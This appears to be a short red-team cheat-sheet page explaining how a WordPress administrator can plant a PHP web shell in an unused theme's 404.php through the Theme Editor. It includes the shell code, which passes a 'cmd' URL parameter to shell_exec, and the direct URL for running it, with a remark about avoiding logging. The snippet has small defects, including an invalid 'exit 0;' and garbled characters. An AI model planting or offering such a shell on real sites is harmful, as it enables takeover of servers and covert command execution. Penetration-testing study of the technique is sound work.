# WordPress Admin RCE

With sufficient privileges, it is possible to exploit a remote command execution (RCE) vulnerability on WordPress.

Since admins can modify templates, and templates are written in PHP, we can replace one of them with a remote shell.

Select `Appearance` then `Theme Editor`. Select a theme, preferably one that is not used to avoid breaking things.

Pick a non-critical file such as `404.php` and add to it a [web shell](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md):
</div><div>

```php!
<?php
// add your webshell
echo "<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>";
// ‚ö†Ô∏è it may not work, prevent the rest of the page from showing up
exit 0;
```

To execute it, aside from running a 404 which may recorded, directly access the file from the theme folder:

```text!
/wp-content/themes/<theme_name>/404.php
```
</div></div>
